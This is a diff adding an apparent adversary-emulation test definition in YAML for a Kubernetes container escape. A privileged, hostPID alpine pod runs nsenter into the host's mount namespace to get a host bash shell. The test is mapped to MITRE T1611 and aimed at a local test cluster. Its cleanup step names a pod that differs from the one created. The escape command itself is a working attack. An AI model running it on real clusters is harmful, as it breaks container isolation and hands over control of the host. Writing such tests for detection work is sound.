@@ -1,0 +1,26 @@
+api_version: "2.0"
+name: Deploy container using nsenter container escape
+description: |
+    In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.
+
+    Additional Details:
+    - https://twitter.com/mauilion/status/1129468485480751104
+    - https://securekubernetes.com/scenario_2_attack/
+uuid: 0b2f9520-a17a-4671-9dba-3bd034099fff
+mitre:
+    tactics:
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1611: Escape to Host'
+requirements:
+    platforms:
+        - os: containers
+steps:
+    - name: deploy-container-using-nsenter-container-escape
+      inline: |
+        kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
+      executor: sh
+      cleanup:
+        inline: |
+            kubectl --context kind-atomic-cluster delete pod atomic-escape-pod
+        executor: sh
